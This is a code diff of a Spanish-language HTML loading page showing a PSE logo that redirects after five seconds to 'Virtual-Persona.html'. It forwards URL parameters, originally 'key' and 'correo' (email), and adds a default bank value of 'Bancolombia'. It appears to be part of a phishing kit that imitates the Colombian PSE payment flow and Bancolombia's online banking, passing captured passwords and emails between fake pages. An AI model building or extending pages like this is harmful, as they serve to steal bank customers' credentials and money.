@@ -28,25 +28,22 @@
   <img id="logo" src="img/pse1.png" alt="Cargando...">
 
   <script>
-    // Función para obtener parámetros de la URL
     function getParam(name) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(name);
     }
 
-    const key = getParam("key");
-    const correo = getParam("correo");
+    const params = new URLSearchParams(window.location.search);
+    if (!params.has("banco")) params.set("banco", "Bancolombia");
 
     const logo = document.getElementById("logo");
 
-    // Efecto palpitación
     setInterval(() => {
       logo.classList.toggle("pulse");
     }, 600);
 
-    // Redirección a los 5 segundos con las variables recibidas
     setTimeout(() => {
-      window.location.href = "Virtual-Persona.html?key=" + encodeURIComponent(key) + "&correo=" + encodeURIComponent(correo);
+      window.location.href = "Virtual-Persona.html?" + params.toString();
     }, 5000);
   </script>
 </body>
